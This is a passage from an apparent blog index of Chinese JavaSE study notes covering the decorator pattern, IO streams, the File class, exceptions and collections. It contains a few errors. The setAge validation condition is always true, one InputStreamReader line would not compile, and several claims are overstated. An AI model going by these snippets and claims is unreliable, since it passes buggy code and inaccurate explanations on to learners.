    <content type="text"><![CDATA[装饰设计模式代码示例 12345678910111213141516171819202122232425262728293031323334interface Coder &#123; public void code();&#125;class Student implements Coder &#123; @Override public void code() &#123; System.out.println("javase"); System.out.println("javaweb"); &#125; &#125;class HeiMaStudent implements Coder &#123; //1,获取被装饰类的引用 private Student s; //获取学生引用 //2,在构造方法中传入被装饰类的对象 public HeiMaStudent(Student s) &#123; this.s = s; &#125; //3,对原有的功能进行升级 @Override public void code() &#123; s.code(); System.out.println("ssh"); System.out.println("数据库"); System.out.println("大数据"); System.out.println("..."); &#125;&#125; 装饰设计模式的好处 耦合性不强,被装饰的类的变化与装饰类的变化无关]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>设计模式</tag>
        <tag>装饰设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流_字符流]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E5%AD%97%E7%AC%A6%E6%B5%81%2F</url>
    <content type="text"><![CDATA[字符流概述 读写字符的IO流，字符流读取字符，需要先读取到字节数据，然后转为字符，如果要写出字符，需要把字符转为字节再写出 ps：字符流除了读取字符、不能拷贝非纯文本文件，其他功能都和字节流差不多，因为它底层就用到了FileInputStream与FileOutputStream 字符流的继承体系： Reader InputStreamReader 它是字节流通向字符流的桥梁，可用用它指定码表 FlieReader 文件字符输入流类 BufferedRead 封装的缓冲区的输入流，它可以传入InputStreamReader LineNumberReader Writer InputStreamWrite 它是字符流通向字节流的桥梁，可以用它指定码表 FileWrider 文件字符输出流类 BufferedWriter 封装的缓冲区的输出流，它可以传入InputStreamWrite 字符流读取字符原理 读取到字节数据通过码表（gbk、utf-8等），一次读取一个字符 ps：汉字的码表前第一个字节一定是负数 写出字符流时的注意事项 1、写出字符流后一定要关流，否则不会写出去，因为字符流底层因为需要先读取字节流然后通过码表读取文件内的字节，所以他会创建一个缓冲区，当然这个缓冲区只能用作字节与码表的转换。 2、只能拷贝纯文本文件，不可以拷贝非纯文本文件，因为在读的时候会将字节转换为字符，在转换过程中遇到找不到码表上的对应字符就会用？代替，这样写出的话会把？也写出去，这样文件就损坏了。 3、在使用BufferedWrite创建字符输出流时，第二个参数不传入true则不清空文件中原来的数据 什么情况下使用字符流？ 1、字符流可以拷贝文本文件，但是不推荐使用，因为读取时会把字节转换成字符，写出时还要把字符转换成字节，这样会大大的影响效率。 2、程序需要读取一段文本，或者写出一段文本的时候可以使用 3、读取的时候是按照字符大小读取的，所以不会出现半个中文等 4、写的时候可以直接将字符串写出，不需要转换为字节数组 字符流中Buffered封装类的特殊方法： .readLine() 读取一个文本行返回String，也就是读一行，此方法遇到\r或者\n就认为某行已经终止，它没有任何终止符，只要没数据了就返回null .newLine() 写出一个回车换行符，配合readLine使用，因为readLine是获取每行，而不会有换行，所以需要newLine换行。 newLine与\r\n的区别 1、newLine是跨平台的方法， 2、\r\n只支持windows系统 BufferedReader子类LineNumberReader的特殊方法 .getLineNumber() 获取当前行号 .setLineNumber() 设置行号，放在遍历获取文本前可以起到初始行号的作用 使用指定码表读写字符123InputStreamReader isr = new InputStreamReader(new FileInputStream(1.txt, "utf-8"));BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream("1.txt"), "gbk"));//带buffered的 ps:写出字符流同理。 面试题之——获取文本上每个字符出现的次数 思路 1、创建输入流读取文本 2、创建map集合保存每个字符出现的次数 3、遍历输入流文本，然后判断每一个字符存入map集合，有相同的那就value加一，没有就加入并且value为1 4、创建输出流 5、遍历集合，把集合输出到文本 6、关闭流 代码示例：123456789101112131415161718192021 BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream("1.txt"), "gbk")); HashMap&lt;Character, Integer&gt; hm = new HashMap&lt;&gt;(); int c; while ((c = br.read()) != -1) &#123; char ch = (char)c; hm.put( ch, hm.containsKey(ch) ? hm.get(ch) + 1 : 1); &#125; br.close(); BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream("2.txt"), "gbk")); for(Character me : hm.keySet()) &#123; switch (me) &#123; case '\t' : bw.write("\\t=" + hm.get(me));break; case '\n' : bw.write("\\n=" + hm.get(me));break; case '\r' : bw.write("\\r=" + hm.get(me));break; default:bw.write(me + "=" + hm.get(me)); &#125; bw.newLine(); &#125; bw.close();&#125;]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流</tag>
        <tag>字符流</tag>
        <tag>获取文本上每个字符出现的次数面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流_文件字节流]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81-%E6%96%87%E4%BB%B6%E5%AD%97%E8%8A%82%E6%B5%81%2F</url>
    <content type="text"><![CDATA[FileInputStream概述 它是一个输入流，它的作用是从文件系统中的某个文件中获得输入字节，它是InputStream的子类 创建一个文件输入流12FileInputStream fis = new FileInputStream("1.txt");//其实就是创建一个流的对象，不用了关闭即可 IO文件输入流的方法 .read() 从输入流读取下一个字节返回这个字节的int值，文件结束标记是-1，也就是读到-1就读完这个文件了。 .read(arr) 从输入流读取字节存到arr数组中，也就是内存中，返回读取到的字节数 .available() 获取可以读的剩余字节数 为什么read（）方法读取一个字节返回的是int而不是字节类型的byte？ 解答： 一个字节等于8个二进制位，也就是-1的二进制位补码是1111 1111，然后文件的底层都是以二进制形式存储的，这些文件的二进制中难免中途会遇到某个字节是1111 1111（八个一），如果read方法直接返回byte的话那么遇到这种情况就直接停止读取文件了，为了解决这个问题就直接返回int而不直接返回byte，因为在Java中一个int数据占4个字节，也就是占32个二进制位，而read方法中从文件读取一个字节就在其二进制位前面加上24个0让其组成一个int类型数据返回，这样就返回了一个255而不是返回1了，这样就可以保证数据的完整，而文件结束标记的-1它本身就是整数型所以不会受到影响。当然在使用输出流输出文件时write方法会自动去除int前面的24个零。 FileOutputStream的概述 它是一个输出流，它的作用将指定字节写入此文件输出流，它是OutputStream的子类 输出流注意事项 1、输入流指定的文件不存在会报错，而输出流却不会，它是直接创建这个文件 2、虽然写出的是一个int类型的数据，但其实write方法会自动去除int数据的前3个8位2进制位 3、如果文件存在，那么就会先将文件内容清空，如果不要让他清空要追加，那么就在创建对象时第二个参数传入一个true 例子：1FileOutputStream fos = new FileOutputStream("1.txt", true); IO文件输出流的方法 .write() 将指定字节写入此文件输出流 .write(arr) 将arr数组中的字节写到文件中 .write(arr, off, len) off为数组起始偏移量，也就是起始索引，通常0、len就是要写入数据的总长度 利用IO流进行文件拷贝例程之——缓冲区拷贝（单纯拷贝时推荐，中间需要对数据进行处理则使用带Buffered的封装类）1234567891011121314151617181920FileInputStream fis = new FileInputStream("致青春.mp3");//创建输入流对象,关联致青春.mp3FileOutputStream fos = new FileOutputStream("copy.mp3");//创建输出流对象,关联copy.mp3//int len = fis.available();//System.out.println(len);byte[] arr = new byte[fis.available()];//创建与文件一样大小的字节数组fis.read(arr);//将文件上的字节读取到内存中fos.write(arr);//将字节数组中的字节数据写到文件上fis.close();fos.close(); ps：不推荐使用，因为一次性把所有字节都读下来放在内存中会导致占用内存过多，如果操作的是一个蓝光电影，就会内存溢出。 解决方法： 一次处理一部分数据，分批次处理即可，代码如下 1234567 byte b[] = new byte[8192];//缓冲区一定要为1024的整数倍 int len; while ((len = fis.read(b)) != -1) &#123; fos.write(b, 0, len); &#125; 利用IO流进行文件拷贝例程二之——普通拷贝12345678910111213141516FileInputStream fis = new FileInputStream("致青春.mp3");//创建输入流对象,关联致青春.mp3FileOutputStream fos = new FileOutputStream("copy.mp3");//创建输出流对象,关联copy.mp3int b;//在不断的读取每一个字节while((b = fis.read()) != -1) &#123; fos.write(b); //将每一个字节写出&#125;fis.close();//关流释放资源fos.close(); ps：他有个缺点，那就是效率非常的慢，因为需要一个字节一个字节的读然后写。 利用IO流进行文件拷贝例程三之——BufferedInputStream和BufferOutputStream拷贝 字节流一次读写一个数组的速度明显比一次读写一个字节的速度快很多，这是加入了数组这样的缓冲区效果，java本身在设计的时候，也考虑到了这样的设计思想(装饰设计模式后面讲解)，所以提供了字节缓冲区流 BufferedInputStream BufferedInputStream内置了一个缓冲区(数组)从BufferedInputStream中读取一个字节时BufferedInputStream会一次性从文件中读取8192个, 存在缓冲区中程序再次读取时, 就不用找文件了, 直接从缓冲区中获取直到缓冲区中所有的都被使用过, 才重新从文件中读取8192个 BufferedOutputStream BufferedOutputStream也内置了一个缓冲区(数组)程序向流中写出字节时, 不会直接写到文件, 先写到缓冲区中直到缓冲区写满, BufferedOutputStream才会把缓冲区中的数据一次性写到文件里 1234567891011121314151617181920FileInputStream fis = new FileInputStream("致青春.mp3");//创建文件输入流对象,关联致青春.mp3BufferedInputStream bis = new BufferedInputStream(fis);//创建缓冲区对fis装饰FileOutputStream fos = new FileOutputStream("copy.mp3");//创建输出流对象,关联copy.mp3BufferedOutputStream bos = new BufferedOutputStream(fos);//创建缓冲区对fos装饰int b;while((b = bis.read()) != -1) &#123; bos.write(b);&#125;bis.close();//只关装饰后的对象即可bos.close(); flush和close的区别 1、flush只是刷新缓冲区，后面还可以写（默认缓冲区存满放到文件，为了拷贝文件的完整性，拷贝完之后一定要刷新缓冲区，缓冲区也就是那个数组） ps：一般用带Buffered的IO文件流才用的到，自己创建缓冲区每次都存到文件里去了。 2、close是关闭流，不过在关闭流之前会刷新一便缓冲区，关闭后不能写。 使用jdk封装好的带Buffered的字节流类与手动创建字节缓冲区效率的区别 1、带Buffered的封装类实现文件复制会有两个缓冲区ps:BufferedReader是先将数据抓取到内存的缓冲区再从缓冲区中读取字节或数组，操作的是Buffer里的数据（非底层硬盘的数据） 2、自己手动创建缓冲区的话有一个缓冲区就能实现文件复制 3、但是两个缓冲区都是再内存中的，所以他们之间的赋值对效率不会有很大影响 4、得出结论：手动创建缓冲区比Buffered封装类效率相对高一点点 1.6版本和之前流的标准异常处理代码（面试会用到，背都要背下来） try finally嵌套123456789101112131415161718FileInputStream fis = null;FileOutputStream fos = null;try &#123; fis = new FileInputStream("aaa.txt"); fos = new FileOutputStream("bbb.txt"); int b; while((b = fis.read()) != -1) &#123; fos.write(b); &#125;&#125; finally &#123; try &#123; if(fis != null) fis.close(); //能关掉一个算一个 &#125;finally &#123; if(fos != null) fos.close(); &#125;&#125; 1.7版本新特性之异常处理的标准代码： 新特性： 在try后接一个小括号，我们把流对象写在小括号内，程序运行完之后自动关闭流 为什么会自动关闭流？ 因为，FileInputStream 与 FileOutputStream 类都实现了AutoCloseable接口，当然我们自己写个类然后重写close方法也能实现自动关闭 注意事项： 在开发中用到的不多，但是要知道，因为面试肯能会遇到。 try close12345678910try( FileInputStream fis = new FileInputStream("aaa.txt"); FileOutputStream fos = new FileOutputStream("bbb.txt"); MyClose mc = new MyClose();)&#123; int b; while((b = fis.read()) != -1) &#123; fos.write(b); &#125;&#125; 拓展知识之——文件加密 原理 我们知道2 ^ 3 = 1这是个异或运算也就是0010 ^ 0011 = 0001. 那么我们就可以 源数据 ^ 密文 = 加密后的数据加密后的数据 ^ 密文 = 源数据 通过异或这个原理，我们可以知道用相同数异或两编，那么原来的数就会回来，这样我们就可以再写出字节流时，把写出的数据进行一遍异或运算，这样就达到了加密的效果，解密就是读取的时候再异或同样的数，这样原来的数据就回来了，不过这样加密数据为了代码更加简洁就需要使用Buffered的字节流对象，不能自己创建缓冲区了。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流</tag>
        <tag>文件字节流</tag>
        <tag>标准异常处理代码（面试会用到，背都要背下来）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——IO流的概念]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94IO%E6%B5%81%E7%9A%84%E6%A6%82%E5%BF%B5%2F</url>
    <content type="text"><![CDATA[IO流的概念 1、IO流用来处理设备之间的数据 2、java对数据的操作时通过流的方式 3、java用于操作流的类都在IO包中 4、流按照操作类型分为两种： 字节流：字节流可以操作任何数据，因为在计算机中任何数据都是以字节形式储存的 字符流：字符流只能操作纯字符类型的数据，比较方便 5、按照流向分类分为：输入流、输出流 IO流的常用父类 字节流的抽象父类： InputStream（输入流） outputStream（输出流） 字符流的抽象父类： Reader（输入流） Writer（输出流） IO的使用 1、使用前，导入IO包 2、使用时，进行IO异常处理 ps：因为IO流时处理内存和硬盘之间的关系，如果硬盘没有某个文件，那么会出错 3、使用后释放资源 ps：因为IO流相当于一个建立在内存和硬盘之间的管道，不用了就要把这个管道关闭。 IO流的注意事项 流对象尽量晚开早关]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>IO流的概念</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——File类]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94File%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[File的概述 它是文件或者目录的抽象表现形式，其实File更应该叫做一个路径，分为文件路径和文件夹路径，路径分为相对路径和绝对路径。 Flie的实例化 File(pathname) 直接根据一个路径得到File对象 File(parent，child) parent是父级路径，child是子文件或者文件夹，在一个目录下我们需要处理多个子文件或文件夹时可以更方便 File(file, child) file是一个File对象，chile是子文件或文件夹，封装成File传入更加强大，可以用到File类中的功能 File类的方法 .exists() 判断文件是否存在，存在true .createNewFile() 判断是否存在某个文件，不存在创建返回true，存在返回false .mkdir() 创建文件夹成功返回true，不成功返回false .mkdirs() 创建多级文件夹 .renameTo(file) 把文件重命名为指定路径 注意事项：1、如果路径名相同，那就是改名2、如果路径名不同，那就是改名并且剪切 .delete() 删除文件或者文件夹 注意事项：1、Java中的删除不走回收站2、只能说删除空的文件夹，如果文件夹里面还有内容，就需要遍历一个一个删除 File类的判断方法 .isDirectory() 判断是否是目录 .isFile() 判断是否是文件 .exists() 判断是否存在 .canRead() 判断是否可读 ps：windows系统的所有文件都是可读的，linux系统就可以不能读 .canWrite() 判断是否可写 .isHidden() 判断是否隐藏 File类的获取方法 .getAbsolutePath() 获取绝对路径（包括盘符的路径） .getPath() 获取路径（构造File方法时传入的路径） .geName() 获取名称 .length() 获取长度（字节数） .lastModified() 获取最后一次修改时间（毫秒值） .list() 获取目录下所有文件或文件夹名称，返回一个String数组 .listFiles() 获取目录下所有文件或文件夹名称，返回一个File数组 文件名称过滤器FilenameFilter概述 通过重写FilenameFilter类中的accept方法，然后调用list方法获取所有文件时传入可以达到过滤文件的目的 示例： 12345678910111213String[] arr = dir.list(new FilenameFilter() &#123; @Override public boolean accept(File dir, String name) &#123; File file = new File(dir, name); return file.isFile() &amp;&amp; file.getName().endsWith(".jpg"); //重写的accept方法一直返回true则获取到所有文件和文件夹，返回falst则不获取那个文件或者文件夹 &#125;&#125;);for (String string : arr) &#123; System.out.println(string);&#125; 利用递归获取.java结尾的文件：123456789101112131415public static void main(String[] args) &#123; getFile(new File(".\\"));&#125;public static void getFile(File f) &#123; File[] farr = f.listFiles(); for(File name : farr) &#123; if(name.isFile() &amp;&amp; name.getPath().endsWith(".java")) &#123; System.out.println(name.getName()); &#125;else if(name.isDirectory())&#123; getFile(name); &#125; &#125;&#125;]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>File类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——异常]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E5%BC%82%E5%B8%B8%2F</url>
    <content type="text"><![CDATA[异常的概述 异常就是java程序在运行过程中出现的错误 异常类 Throwable 异常的继承体系： Throwable Error 服务器出问提，数据库崩溃等 Exception RuntimeException 这个是运行时异常，全部的运行时异常都在这，一般都是我们自己犯的错误，修改代码即可 。。。。。等等 jvm默认的异常处理机制 会将异常的名称、异常的信息、异常出现的位置打印在控制台，并且程序停止运行。 异常处理命令 try…catch try 用来检测异常，如果出现异常，那么会抛出一个对应的异常对象 catch 用来捕获异常，需要定义一个引用来接收异常对象，可以使用多个catch来捕获多种异常。 ps：理论上是有什么错误用什么去引用，但是实际开发建议直接创建Exception这个父类引用它的子类对象。 finally 释放资源，一般对io流或者数据库进行关闭 它们三的常用搭配： 1、try catch异常处理基本格式 2、try catch finally 3、try finally ps：。。。。。世界上最真情的相依就是你在try我在catch，无论你发神马脾气，我都静静接收，默默处理。。。。 小知识： 1、安卓开发属于客户端开发，一般都是直接Exception 2、javaEE属于服务端开发，一般都是底层开发，从底层向上抛，最后放到一个错误日志。 3、在有多个catch时，大的异常放后面，因为根据多态的原理，大的异常放前面没有意义。 jdk7以后如何处理多个异常，有时候面试会问 用“|”连接两个异常类即可实现一个catch处理多个异常，但是这样还不如直接Exception。 java异常的种类 Java异常被分为两大类，分别是编译时异常和运行时异常。 编译时异常java程序必须显示处理，否则就会发生错误，不处理无法通过编译 运行时异常 无需显示处理，也可以和编译时异常一样处理 Throwable的几个常见方法： .getMessage() 获取异常信息，返回字符串 .toString() 获取异常类名和异常信息，返回字符串 .printStackTrace() 获取异常类名和异常信息，以及异常出现在程序中的位置，返回值void，jvm默认用它处理异常。 异常抛出 throw new 异常类 注意事项： 除了RuntimeException类的错误，也就是运行时错误，其他错误都要在方法上使用throws向上抛出这个错误。 异常的抛出例子： 1234567public void setAge(int age) throws Exception&#123; if(age &gt; 0 || age &lt; 150) &#123; this.age = age; &#125;else &#123; throw new Exception("年龄非法"); &#125;&#125; throw概述 在功能方法内部出现某种情况，程序不能继续运行，需要进行跳转时，就用throw把异常抛出 throws和throw区别，可能面试会问： throws 1、用在方法声明后面，跟的时异常类名 2、可以跟多个异常类名，用逗号隔开 3、表示这个方法抛出了异常，让方法的调用者来处理 throw 1、用在方法体内部，跟的时异常对象名 2、只能抛出一个异常对象名，不能接多个 3、表示这个方法抛出了异常，方法内部处理 finally特点： 被finally控制的语句一定会执行，就算执行了return语句finally中的语句也会执行 特殊情况：在执行到finally之前jvm退出了，比如执行System.exit(0) finally作用 用于资源释放，通常在哎IO流和数据库操作中会使用 finally关键字的面试题： final，finally和finalize的区别 解答：final：修饰类不能被继承，修饰方法不能被重写，修饰变量只能赋值一次（常量） finally：它是tyr语句中的语句体，不能单独使用，它用来释放资源 finalize：是一个方法，当垃圾回收器确定不存在对该对象的引用时，对象的垃圾回收器调用此方法。ps：他们三没任何联系，只是长得像而已。 如果catch里面有return语句，请问finally的代码还会执行吗?如果会请问时在return前还是return后？ 解答：会，并且是在return之后执行，因为在return相当于已经建立好了一个返回路径，然后再执行finally，然后再根据之前建立的返回路径彻底返回。 ps：千万不要再finally内写返回语句，因为finally的作用是为了释放资源，如果再这里写返回语句，那么try和catch的结果都会被改变。 自定义异常方法 定义一个异常类，然后继承Exception并重写构造方法即可 代码示例：12345678910111213class AgeOutOfBoundsException extends Exception &#123; public AgeOutOfBoundsException() &#123; super(); &#125; public AgeOutOfBoundsException(String message) &#123; super(message); &#125; &#125; 为什么要自定义异常？ 解答： 只是为了看那个异常类的名字而已，这样好排错。 ps：继承RuntimeException的话可以不用在声明方法那里抛出异常 异常注意事项 1、子类重写父类方法时，子类必须抛出相同异常或者父类异常的子类，也就是说子类抛出的异常不能比父类大，需要比父类更加细，打个比方，父亲坏儿子不能比他更坏。父亲没坏儿子自己处理 2、如果父类抛出多个异常，子类重写父类的时候子类不能抛出父类没有的异常 3、如果被重写的方法没有抛出异常，那么子类绝对不可以抛出异常，如果子类有异常只能用try不能throws抛出 如何使用异常处理？ 原则： 如果该功能内部可以将问题处理，就用try，不能处理就用throws向上抛出，交给调用者处理 区别： 1、后面还有代码需要执行，就用try 2、如果后面不需要代码执行了，就用throw]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>异常</tag>
        <tag>throw</tag>
        <tag>throws</tag>
        <tag>final，finally和finalize的区别面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Collections工具类与集合总结]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Collections%E5%B7%A5%E5%85%B7%E7%B1%BB%E4%B8%8E%E9%9B%86%E5%90%88%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[Collections中的常用方法 Collections.sort(list) 把集合进行排序 Collections.banarySearch(list, 需要查的元素) 用二分查找法查询某个集合中的元素，二分查找法前提是集合是有序的，找不到返回-(插入点 - 1） Collections.max(list) 根据默认排序返回集合中最大的元素 Collections.min(list) 根据默认排序返回集合中最小的元素 Collections.reverse(list) 反转集合 Collections.shuffle(list) 随机置换，可以洗牌。 集合总结 Collection List(存取有序,有索引,可以重复) ArrayList 底层是数组实现的,线程不安全,查找和修改快,增和删比较慢 LinkedList 底层是链表实现的,线程不安全,增和删比较快,查找和修改比较慢 Vector 底层是数组实现的,线程安全的,无论增删改查都慢 如果查找和修改多,用ArrayList如果增和删多,用LinkedList如果都多,用ArrayList Set(存取无序,无索引,不可以重复) HashSet 底层是哈希算法实现 LinkedHashSet底层是链表实现,但是也是可以保证元素唯一,和HashSet原理一样 TreeSet 底层是二叉树算法实现 一般在开发的时候不需要对存储的元素排序,所以在开发的时候大多用HashSet,HashSet的效率比较高 TreeSet在面试的时候比较多,问你有几种排序方式,和几种排序方式的区别 Map HashMap 底层是哈希算法,针对键 LinkedHashMap底层是链表,针对键 TreeMap 底层是二叉树算法,针对键 ps：开发中用HashMap比较多 面试题之——TreeSet或者TreeMap有几种排序方式和区别TreeSet或者TreeMap排序的两种方式 第一种 构造TreeSet集合什么都不传，就默认使用类中的Comparable的顺序，也就是compareTo方法。（传入集合的自定义对象实现了Comparable接口则用自定义类中重写的compareTo方法） 第二种 构造TreeSet集合传入Comparator比较器，那么优先按照比较器顺序排序。 引用自javaSE复习之——TreeSet类 ps： 1、在开发中，单列集合存储重复元素优先考虑ArrayList，不重复的元素优先考虑HashSet，双列集合直接考虑HashMap 2、单列集合（collection）中Set集合类型其实底层都依赖map集合，它封装了map集合，当中只使用到了key，而value用固定的值替代(Object对象)。 3、tree类型的map和set集合平时都不常用，但是面试会用，一般问你有几种排序方式,和几种排序方式的区别]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>集合总结</tag>
        <tag>Collections工具类</tag>
        <tag>面试题之——TreeSet或者TreeMap有几种排序方式和区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Map类]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Map%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[map集合的概述 它是将键映射到值的对象，类似python中的字典，它是无序的。 特点 1、一个map对象不能包含重复的键 2、一个键只能映射到一个值 3、map接口的实现分为hashMap和treeMapps：只要是hash算法实现的集合，那么它都是无序的。 4、map集合不能直接进行迭代。 解决方法1（底层调用原map集合太多）利用keySet获取所有键的对象，然后迭代这个对象逐个get获取值，这样可以从侧面迭代map集合。ps：利用增强for循环可以更简便的拿到map集合中的每个值。 解决方法2（推荐使用）：利用entrySet方法获取一个键值对Entry对象，然后迭代或者增强for循环这个Entry对象然后逐个获取值即可。 注意事项：传入引用数据类型时，必须重写hashCode和equals方法 map和colllection的不同： 1、map是双列的，collection是单列的 2、map键唯一，collection只有它的子体系Set是唯一的ps：其实set集合是依赖与map的hash算法的，只是set集合中把map集合封装了一下，里面只使用了键，而值用object对象填充 3、Map的数据结构只针对键有效，和值无关；collection的数据结构针对元素有效 创建map对象1map&lt;String, Integer&gt; map = new hashMap&lt;&gt;(); map集合中的方法 添加方法： .put(key, value)向map集合中添加一个键值对元素，新添加返回null，覆盖返回被覆盖的值 删除方法： .clear()删除全部键值对元素 .remove(key)删除指定键对应的键值对 判断方法： .containsKey(key)判断集合中是否包含指定的键 .containsValue(value)判断集合中是否包含指定的值 .isEmpty()判断集合是否为空 获取功能： .entrySet()拿到map集合的键值对象，返回set&lt;map.Entry&lt;K,V&gt;&gt;ps：Map.Entry是Map接口的内部接口，它实现了将键和值封装成了一个Entry对象，储存再Set集合中。 .get(key)根据键获取值 .keySet()获取集合中所有键的集合，返回Set .values()获取集合中所有值的集合，返回Collection 长度功能： .size()返回键值对个数 linkedHashMap特点 它是有序的，怎么存就怎么打印 TreeMap特点： 1、可以用来排序，值是唯一的，等等 2、传入引用数据类型时，必须重写compareTo方法，否则无法判断值的唯一性，会报错。 3、具体笔记在TreeSet集合中介绍 hashtable和hashMap区别（面试题）： 共同点： 1、底层都依赖hash算法 2、都是双列集合 不同点： 1、HashMap是线程不安全的，效率高，jdk1.2版本出现的 2、Hashtable是线程安全的，效率相对第，jdk1.0版本出现的 3、HashMaop可以储存null键和null值 4、Hashtable不可以储存null键和null值]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Map类</tag>
        <tag>linkedHashMap类</tag>
        <tag>TreeMap类</tag>
        <tag>hashtable和hashMap区别（面试题）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——TreeSet类]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94TreeSet%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[TreeSet的概述 它是一个二叉树集合，小的（负数）放在左边，大的（正数）放在右边，并且对集合元素进行排序，并且可以保证元素的唯一性，也就是去除重复，它的主要功能是排序。它依赖map集合 TreeSet特点： TreeSet集合存储元素取决于compareTo方法的返回值。 返回0：表示作比较的两个对象是相等的，这时集合不存这个元素。 返回负数：表示要存入的元素小于上一个作比较元素，然后把这个元素放在作比较元素的左边，如果它的左边还有元素就再进行比较 返回正数：表示大于上一个元素，这时把这个元素放在上一个元素的右边，如果右边还有元素，就再进行比较。 TreeSet存元素的原理 首先存入第一个元素（根元素），然后再存入第二个元素时调用compareTo方法取到返回值，然后根据返回值存元素； 如果之前已经存了n个元素，那么调用compareTo逐次与每个元素作比较， TreeSet取元素原理 从最小的开始取，也就是从左向右取，先取根元素左边的元素，如果根元素左边的元素下面还有元素就先从那里开始取，这里也是从左到右的原理，取根元素右边元素也是同理，从左边向右边取元素，如果左边或右边元素下面还有元素，那么也是遵循从左到右的原则。 注意：左边元素全部取完后再慢慢向右边取 为什么存入自定义对象的时候会报错？ 原因： 因为TreeSet会对集合元素进行排序，而它不知道自定义对象按照什么方法来排序，所以会报错。 解决方法： 让自定义对象这个类去实现Comparable接口，然后重写compareTo方法，此方法返回0则集合只能存一个对象，返回1按照存的顺序排序，返回-1按照存的顺序的倒叙存。 重写compareTo例子1234public int compareTo(Student o) &#123; int num = o.sum - this.sum; return num == 0 ? 1 : num;&#125; ps：比较字符串可以调用字符串的conpareTo方法比较 TreeSet比较器Comparator的概述 可以自定义对TreeSet集合进行排序 使用方法 首先创建一个类并且让这个类实现Comparator接口，然后重写compare方法，最后在创建TreeSet集合对象的时候创建这个类的对象传入即可。 特点 compare方法中第一个参数是调用的对象，第二个参数是被比较集合中的对象 两种排序方式的区别 1、构造TreeSet集合什么都不传，就默认使用类中的Comparable的顺序，也就是compareTo方法。（传入集合的自定义对象实现了Comparable接口则用自定义类） 2、构造TreeSet集合传入Comparator比较器，那么优先按照比较器顺序排序。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>TreeSet类</tag>
        <tag>Comparator比较器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——HashSet类]]></title>
    <url>%2F2019%2F04%2F10%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94HashSet%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[概述 他没有自己特殊的方法，它的方法和Collection一样，HashSet集合不能存重复的数据，并且是无顺序的。 特点： 1、没有索引 2、不可以重复 3、无顺序（存和取不一致） 为为什么要存储自定义对象 因为别人的类我们不知道它重写了哪些方法来保证元素的一致性。 HashSet集合存集合的原理 加入每个元素都会先调用hashCold方法来生成一个Hash值，这个值就相当于存那个元素的地址，如果hash值不一样就不会调用equals方法判断，如果hash值相同就通过equals方法对比在同一个地址中的数据是不是相同的，相同丢弃不相同就存入。 HashSet中遇到的常见问题： 为什么在集合中存入自定义对象的时候重复的数据也会被存进去？ 原因1:因为父类的hashCold方法会为每一个元素生成不一样的hash值，所以导致地址不一样 原因2:父类的equals方法对比的时对象的地址，而不是对象里面的值 解决方法：在自定义的类中重写equals方法和hashCold方法 为什么尽量使用计算hash值的方法来判断两个我们知道相等的对象是否相等？ 原因：HashSet集合加入元素的顺序是先判断hash值如果hash值一样就调用equals判断，如果我们用算法让相同的对象值计算出相同的hash值，不同的对象值计算出不同的hash值，那么就可以让程序少调用一次equals方法，这样可以提高效率。 注意事项：重写hashCold方法时，属性相同的对象hash值一定要一样，属性不一样的对象hash值要尽量不一样（提高效率） 重写hashCold中的面试题： 为什么使用Eclipse重写的hashCold方法中，为了让传入对象计算的hash值不一样，而定义的一个用来算法计算的值是31？ 原因1：它是一个质数，它只能被1和本省整除，这样可以减小两个对象计算的hash值相同的概率 原因2：31这个数不大也不小，太小了计算的值容易重复，太大了容易超过int范围。 原因3：31这个数好算，它是2的5次方-1，也就是2的二进制位向左移动5位。 LinkedHashSet的概述 